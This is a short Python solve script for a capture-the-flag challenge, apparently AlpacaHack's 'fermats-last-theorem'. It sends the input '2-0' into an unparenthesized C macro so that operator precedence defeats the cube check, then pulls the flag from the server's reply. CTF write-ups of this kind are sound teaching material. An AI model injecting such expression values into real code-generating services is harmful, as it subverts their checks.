#!/usr/bin/env python3
"""
fermats-last-theorem — AlpacaHack Daily 2026-08-11

server.py reads A,B,C (each kept to <=3 chars of [-0-9]) and substitutes them
textually into C code using an UNPARENTHESIZED macro:  #define CUBE(x) (x*x*x).
It prints the flag iff  A>0 && B>0 && C>0 && CUBE(A)+CUBE(B)==CUBE(C).

Because CUBE(x) expands to `x * x * x` (no parens around x), injecting a '-'
lets operator precedence (* over -) break the "cube". Pick:
    A = "1"  -> CUBE = 1*1*1 = 1,  raw 1 > 0
    B = "1"  -> CUBE = 1*1*1 = 1,  raw 1 > 0
    C = "2-0"-> CUBE = 2-0 * 2-0 * 2-0 = 2 - 0*2 - 0*2 - 0 = 2,  raw 2-0 = 2 > 0
Then 1 + 1 == 2 holds, satisfying the "impossible" check.
"""
import socket, sys, time, re
HOST = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
s = socket.create_connection((HOST, PORT), timeout=30); s.settimeout(30)
buf = b""
for val in (b"1", b"1", b"2-0"):
    time.sleep(0.3)
    s.sendall(val + b"\n")
try:
    while True:
        b = s.recv(4096)
        if not b: break
        buf += b
except Exception:
    pass
s.close()
txt = buf.decode(errors="replace")
m = re.search(r"(Alpaca\{[^}]*\})", txt)
print(m.group(1) if m else txt)
